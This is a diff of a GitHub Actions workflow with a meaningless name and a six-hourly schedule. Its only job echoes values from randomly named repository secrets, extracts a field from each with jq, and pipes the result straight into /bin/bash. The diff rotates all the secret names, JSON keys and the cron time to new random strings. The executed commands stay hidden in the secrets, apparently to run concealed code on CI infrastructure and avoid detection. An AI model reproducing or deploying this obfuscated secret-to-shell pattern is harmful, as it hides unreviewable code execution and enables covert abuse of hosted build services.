@@ -3,21 +3,20 @@ name: gaozhongzzx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 4/6 * * *'
-jobs:  # 2943
+    - cron: '7 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaozhongzzx
         env:
-          sko036: ${{ secrets.sko036 }}
+          yvznw29: ${{ secrets.yvznw29 }}
         run: |
-          echo $sko036 | jq -r .u16 | /bin/bash
-          echo $ccsfb96 | jq -r .jn30 | /bin/bash
-          echo $akw5 | jq -r .qkhs86141 | /bin/bash
-          echo $wry76 | jq -r .pwq9 | /bin/bash
-          echo $e532 | jq -r .l9707 | /bin/bash
-          echo $rivuq411 | jq -r .pdnm5701 | /bin/bash
+          echo $yvznw29 | jq -r .zeq510 | /bin/bash
+          echo $r7623 | jq -r .k9 | /bin/bash
+          echo $adjz0 | jq -r .ccmu539 | /bin/bash
+          echo $lgl7 | jq -r .ovq7877 | /bin/bash
+          echo $grid617 | jq -r .lks76 | /bin/bash
+          echo $rsp0324 | jq -r .dbgwx6713 | /bin/bash
 
